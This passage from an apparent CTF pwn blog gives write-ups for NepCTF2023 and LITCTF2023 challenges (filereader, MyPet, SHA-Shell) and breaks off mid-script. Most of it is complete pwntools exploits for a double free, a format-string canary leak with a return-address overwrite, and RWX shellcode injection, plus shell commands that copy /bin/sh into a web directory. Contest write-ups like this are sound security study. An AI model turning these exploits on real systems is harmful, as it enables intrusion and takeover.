&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    req = requests.session()</span><br><span class="line">    url = <span class="string">&quot;http://172.26.0.2:5000&quot;</span></span><br><span class="line">    req.get(url)</span><br><span class="line">    p = tube()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1D62)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">io_recv_raw</span>(<span class="params">*a</span>):</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    r = req.get(url + <span class="string">&quot;/receive&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.json())</span><br><span class="line">    <span class="keyword">return</span> r.json().get(<span class="string">&#x27;output&#x27;</span>, <span class="string">&quot;&quot;</span>).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">io_send_raw</span>(<span class="params">x</span>):</span></span><br><span class="line">    r = req.post(url + <span class="string">&quot;/send&quot;</span>, data=&#123;<span class="string">&quot;input&quot;</span>: x&#125;)</span><br><span class="line">    </span><br><span class="line">p.recv_raw = io_recv_raw</span><br><span class="line">p.send_raw = io_send_raw</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Nepnep&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">data = <span class="string">&quot;mkdir bin&quot;</span></span><br><span class="line">sla(<span class="string">&quot;$&quot;</span>,data)</span><br><span class="line">data = <span class="string">&quot;cd bin&quot;</span></span><br><span class="line">sla(<span class="string">&quot;$&quot;</span>,data)</span><br><span class="line">data = <span class="string">&quot;echo cp /bin/sh /app/templates/kernel&gt;shell&quot;</span></span><br><span class="line">sla(<span class="string">&quot;$&quot;</span>,data)</span><br><span class="line">data = <span class="string">&quot;echo &quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>+<span class="string">&quot;02&quot;</span>+<span class="string">&quot;&gt;payload&quot;</span></span><br><span class="line">sla(<span class="string">&quot;$&quot;</span>,data)</span><br><span class="line">data = <span class="string">&quot;echo mov rdi,payload;syscall 0;echo mov rdi,payload;mov rdx,260;syscall 1;&gt;exp&quot;</span></span><br><span class="line">sla(<span class="string">&quot;$&quot;</span>,data)</span><br><span class="line">data = <span class="string">&quot;exec exp&quot;</span></span><br><span class="line">sla(<span class="string">&quot;$&quot;</span>,data)</span><br><span class="line">data = <span class="string">&quot;mount shell&quot;</span></span><br><span class="line">sla(<span class="string">&quot;$&quot;</span>,data)</span><br><span class="line">data = <span class="string">&quot;exit&quot;</span></span><br><span class="line">sla(<span class="string">&quot;$&quot;</span>,data)</span><br><span class="line"></span><br><span class="line">req.get(url+<span class="string">&quot;/test_system_exec&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>浏览器效果截图：</p>
<img src="/2023/09/07/nepCTF2023/1694094711613.png" class width="1694094711613"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/06/LITCTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/06/LITCTF2023/" class="post-title-link" itemprop="url">LITCTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-09-06 00:16:56 / Modified: 00:18:10" itemprop="dateCreated datePublished" datetime="2023-09-06T00:16:56+08:00">2023-09-06</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>19k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>17 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="filereader"><a href="#filereader" class="headerlink" title="filereader"></a>filereader</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.7</span>)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">2</span>d9ee3867b8472fc809b8d34c0e6b7fc68fa248c, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>绕开这个 double free 就可以获取 flag：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;v6);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;v7);</span><br><span class="line">*v6 = v7;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Exiting...&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br></pre></td></tr></table></figure>
<p>直接覆盖 tcache-&gt;bk 就可以了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./s1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;litctf.org&#x27;</span>,<span class="string">&#x27;31772&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x12C4)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">leak_addr = <span class="built_in">eval</span>(ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">sl(<span class="built_in">str</span>(leak_addr-<span class="number">0x48</span>))</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="MyPet"><a href="#MyPet" class="headerlink" title="MyPet"></a>MyPet</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">845f</span>074a2f75e89b38ab4074668bcd859a39a3e3, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gets(format);</span><br><span class="line"><span class="built_in">printf</span>(format);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">gets(format);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>利用格式化字符串漏洞泄露后门地址和 canary，直接覆盖返回地址为后门地址</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./s&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;litctf.org&#x27;</span>,<span class="string">&#x27;31791&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1238)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload = <span class="string">&quot;%13$p%11$p&quot;</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+ru(<span class="string">&quot;0x&quot;</span>))</span><br><span class="line">pro_base = leak_addr - <span class="number">0x12ae</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">canary = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+ru(<span class="string">&quot;00&quot;</span>))*<span class="number">0x100</span></span><br><span class="line">success(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">back_door = pro_base + <span class="number">0x11EE</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">40</span>+p64(canary)+<span class="string">&quot;b&quot;</span>*<span class="number">8</span>+p64(back_door)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="SHA-Shell"><a href="#SHA-Shell" class="headerlink" title="SHA-Shell"></a>SHA-Shell</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=a473a0cf21f6ae4972ee4e29a626d49552b65dc4, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>mmap 有执行权限：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">result = mmap(<span class="number">0LL</span>, <span class="number">0x10000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">*result = lookup;</span><br><span class="line">result[<span class="number">1</span>] = store;</span><br><span class="line">result[<span class="number">2</span>] = helpMenu;</span><br><span class="line">result[<span class="number">3</span>] = infoBlurb;</span><br><span class="line">result[<span class="number">4</span>] = checkPrintable;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>在 mmap 的空间上写 shellcode，然后想办法覆盖存放于 mmap 上的地址</p>
<p>由于程序会对 index 进行 hash 处理，导致不容易命中 mmap 上的地址，我的解决方法比较简单粗暴：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4000</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(i+<span class="number">1</span>+<span class="number">62175</span>))</span><br><span class="line">    store(<span class="built_in">str</span>(i+<span class="number">1</span>+<span class="number">62175</span>),<span class="string">&quot;a&quot;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>最后发现 <code>74823</code> <code>122935</code> <code>200796</code> 成功输出可用数据</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lookup(<span class="built_in">str</span>(<span class="number">74823</span>))</span><br><span class="line">ru(<span class="string">&quot;Value for \&quot;74823\&quot;: &quot;</span>)</span><br><span class="line">leak_addr = u64(ru(<span class="string">&quot;\n&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">pro_base = leak_addr - <span class="number">0x1581</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br></pre></td></tr></table></figure>
<p>函数 <code>checkPrintable</code> 会过滤非可见字符，导致 shellcode 注入失败</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">result = mmap(<span class="number">0LL</span>, <span class="number">0x10000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">*result = lookup;</span><br><span class="line">result[<span class="number">1</span>] = store;</span><br><span class="line">result[<span class="number">2</span>] = helpMenu;</span><br><span class="line">result[<span class="number">3</span>] = infoBlurb;</span><br><span class="line">result[<span class="number">4</span>] = checkPrintable;</span><br></pre></td></tr></table></figure>
<p>我们可以将其覆盖为函数 <code>hexlifyPrint</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">hexlifyPrint</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%lx\n&quot;</span>, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样既可以泄露 mmap_addr，又可以解除 shellcode 的限制：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p16(printx % <span class="number">0x10000</span>) <span class="comment"># checkPrintable</span></span><br><span class="line">store(<span class="built_in">str</span>(<span class="number">200796</span>),payload)</span><br></pre></td></tr></table></figure>
<p>然后输入 shellcode，计算 shellcode 的地址</p>
<p>最后将 mmap_addr 上的函数指针覆盖为 shellcode_addr 就可以了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 